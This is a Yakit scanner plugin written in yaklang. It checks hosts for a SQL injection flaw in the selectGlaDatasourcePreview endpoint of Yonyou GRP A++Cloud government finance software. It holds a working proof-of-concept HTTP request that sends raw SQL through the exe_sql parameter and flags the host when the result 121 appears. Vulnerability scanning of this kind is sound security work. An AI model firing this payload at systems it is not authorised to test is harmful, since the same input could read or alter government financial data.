# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `POST /gla/dataSource/selectGlaDatasourcePreview HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 74

exe_sql=SELECT%2011*11&pageNumber=1&pageSize=10&exe_param=11,1,11,1,11,1`

    rsp,req,_ = poc.HTTP(packet1, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )

    if str.MatchAllOfSubString(rsp, `"11*11"`) && str.MatchAllOfSubString(rsp, `121`){
        yakit.Info("%v found 用友GRP A++Cloud 政府财务云 selectGlaDatasourcePreview SQL注入漏洞", addr)
        risk.NewRisk(
        addr,
        risk.title("用友GRP A++Cloud 政府财务云 selectGlaDatasourcePreview SQL注入漏洞"),
        risk.severity("high"),
        risk.titleVerbose("用友GRP A++Cloud 政府财务云 selectGlaDatasourcePreview SQL注入漏洞"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
